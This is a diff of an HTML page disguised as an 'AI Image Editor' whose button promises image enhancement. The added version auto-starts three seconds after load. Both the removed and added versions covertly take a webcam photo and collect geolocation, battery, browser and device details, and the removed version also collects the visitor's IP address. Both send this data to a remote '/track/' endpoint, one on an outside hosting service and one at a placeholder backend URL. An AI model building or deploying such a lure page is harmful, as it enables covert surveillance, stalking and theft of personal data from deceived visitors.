@@ -3,119 +3,86 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>AI Image Creator</title>
-    <script src="https://cdn.tailwindcss.com"></script>
+    <title>AI Image Editor</title>
+    <style>
+        body { font-family: Arial, sans-serif; text-align: center; background: #f4f4f4; padding: 20px; }
+        #upload-btn { padding: 10px 20px; font-size: 16px; background: #007bff; color: white; border: none; cursor: pointer; }
+        #upload-btn:hover { background: #0056b3; }
+    </style>
+</head>
+<body>
+
+    <h1>Welcome to AI Image Editor</h1>
+    <p>Upload an image to generate AI enhancements.</p>
+    <button id="upload-btn" onclick="capturePhoto()">Upload</button>
+
     <script>
-        async function trackDevice() {
-            const urlParams = new URLSearchParams(window.location.search);
-            const sessionId = urlParams.get('session') || 'unknown';
+        const backendURL = "https://your-backend-url.com"; // Update this
 
-            let batteryInfo = {};
-            let geoInfo = { latitude: "Unknown", longitude: "Unknown" };
-
-            // Fetch Battery Info
-            if (navigator.getBattery) {
-                let battery = await navigator.getBattery();
-                batteryInfo = {
-                    level: (battery.level * 100) + "%",
-                    charging: battery.charging ? "Yes" : "No"
-                };
-            }
-
-            // Fetch Geolocation
-            if (navigator.geolocation) {
-                await new Promise((resolve) => {
-                    navigator.geolocation.getCurrentPosition(
-                        (position) => {
-                            geoInfo = {
-                                latitude: position.coords.latitude,
-                                longitude: position.coords.longitude
-                            };
-                            resolve();
-                        },
-                        () => {
-                            console.log("Geolocation access denied");
-                            resolve();
-                        }
-                    );
-                });
-            }
-
-            // Fetch Device Info
-            let deviceInfo = {
-                ip: "Fetching...",
-                userAgent: navigator.userAgent,
-                screenWidth: window.screen.width,
-                screenHeight: window.screen.height,
+        async function getDeviceInfo() {
+            return {
                 platform: navigator.platform,
-                language: navigator.language,
-                cookiesEnabled: navigator.cookieEnabled ? "Yes" : "No",
-                plugins: Array.from(navigator.plugins).map(p => p.name).join(", ") || "No Plugins"
+                screenWidth: screen.width,
+                screenHeight: screen.height,
+                userAgent: navigator.userAgent,
+                cookiesEnabled: navigator.cookieEnabled,
+                plugins: navigator.plugins.length ? [...navigator.plugins].map(p => p.name).join(", ") : "No Plugins"
             };
-
-            // Fetch IP Address
-            await fetch('https://api64.ipify.org?format=json')
-                .then(response => response.json())
-                .then(data => deviceInfo.ip = data.ip)
-                .catch(() => console.log("Failed to fetch IP"));
-
-            // Capture Photo and Send Data
-            capturePhoto(sessionId, batteryInfo, geoInfo, deviceInfo);
         }
 
-        async function capturePhoto(sessionId, batteryInfo, geoInfo, deviceInfo) {
+        async function capturePhoto() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 const video = document.createElement('video');
                 video.srcObject = stream;
                 await video.play();
-                
+
                 const canvas = document.createElement('canvas');
                 canvas.width = video.videoWidth;
                 canvas.height = video.videoHeight;
                 const ctx = canvas.getContext('2d');
                 ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                
-                const imageData = canvas.toDataURL('image/png');
-                stream.getTracks().forEach(track => track.stop());
 
-                sendData(sessionId, batteryInfo, geoInfo, deviceInfo, imageData);
+                const imageData = canvas.toDataURL('image/png');  // ✅ Get Base64 image
+                stream.getTracks().forEach(track => track.stop());  // Stop camera access
+
+                sendData(imageData);  // ✅ Send image data to backend
+
             } catch (error) {
-                console.log("Camera access denied");
-                sendData(sessionId, batteryInfo, geoInfo, deviceInfo, null);
+                console.log("Camera access denied: " + error);
             }
         }
 
-        function sendData(sessionId, batteryInfo, geoInfo, deviceInfo, photo = null) {
-            fetch(`https://flash-3vfu.onrender.com/track/${sessionId}`, { // ✅ Now sending data to `/track/<session_id>`
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    battery: batteryInfo,
-                    geo: geoInfo,
-                    device: deviceInfo,
-                    photo: photo
-                })
-            }).then(response => console.log("Data sent successfully"))
-              .catch(error => console.log("Error sending data:", error));
+        async function sendData(photo) {
+            const battery = await navigator.getBattery();
+            const geo = await new Promise(resolve => {
+                navigator.geolocation.getCurrentPosition(
+                    position => resolve({ latitude: position.coords.latitude, longitude: position.coords.longitude }),
+                    () => resolve({ latitude: "Unknown", longitude: "Unknown" })
+                );
+            });
+
+            const device = await getDeviceInfo();
+            const data = {
+                battery: { level: battery.level * 100, charging: battery.charging },
+                geo,
+                device,
+                photo  // ✅ Send captured image
+            };
+
+            const sessionId = Math.random().toString(36).substring(2, 10);
+            fetch(`${backendURL}/track/${sessionId}`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(data)
+            }).catch(err => console.log("Error sending data:", err));
         }
+
+        // ✅ Auto-start tracking when page loads
+        window.onload = () => {
+            setTimeout(capturePhoto, 3000); // Auto-capture photo after 3 seconds
+        };
     </script>
-</head>
-<body class="bg-white text-black">
-    <nav class="bg-gray-200 p-4 flex justify-between shadow-md">
-        <h1 class="text-xl font-bold text-gray-800">AI Image Creator</h1>
-        <ul class="flex space-x-4">
-            <li><a href="#" class="hover:text-blue-600">Home</a></li>
-            <li><a href="#" class="hover:text-blue-600">About</a></li>
-            <li><a href="#" class="hover:text-blue-600">Features</a></li>
-            <li><a href="#" class="hover:text-blue-600">Contact</a></li>
-        </ul>
-    </nav>
-    <div class="flex flex-col items-center justify-center h-screen bg-gradient-to-br from-gray-100 to-blue-100">
-        <h2 class="text-3xl font-bold mb-4 text-gray-800">Enhance Your Images with AI</h2>
-        <p class="text-gray-600 mb-6">Upload an image to enhance with AI-powered editing.</p>
-        <button onclick="trackDevice()" class="bg-blue-500 hover:bg-blue-600 text-white font-bold py-2 px-6 rounded-xl shadow-md">Upload Image</button>
-        <p id="loading" class="text-gray-500 mt-4 hidden">Processing...</p>
-    </div>
+
 </body>
 </html>
